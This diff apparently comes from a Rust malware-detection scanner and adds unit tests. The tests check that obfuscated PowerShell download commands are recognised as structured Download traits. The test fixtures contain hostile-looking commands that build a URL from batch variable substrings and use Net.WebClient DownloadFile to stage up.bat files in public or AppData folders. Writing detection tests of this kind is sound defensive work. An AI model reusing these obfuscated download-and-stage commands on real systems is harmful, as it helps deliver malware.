@@ -25307,9 +25307,61 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned after var-fragment resolution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_downloadfile_promotes_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\Public\\up.bat")
+                )
+            }),
+            "assembled DownloadFile URL not promoted to structured Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_downloadfile_body_promotes_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage\\up.bat")
+                )
+            }),
+            "assembled DownloadFile body not promoted to structured Download: {:?}",
             env.traits
         );
     }
@@ -25331,6 +25383,10 @@ powershell -Command "(New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%�
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned from Unicode set bindings: {:?}",
@@ -25355,6 +25411,10 @@ start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol 
                     Trait::DownloadInDeobText { src, line_hint }
                         if src == "https://github.com/owner/repo/raw/main/up.png"
                             && line_hint == "resolved-deob-var-fragments"
+                ) || matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
                 )
             }),
             "assembled URL not scanned inside nested PowerShell quotes: {:?}",
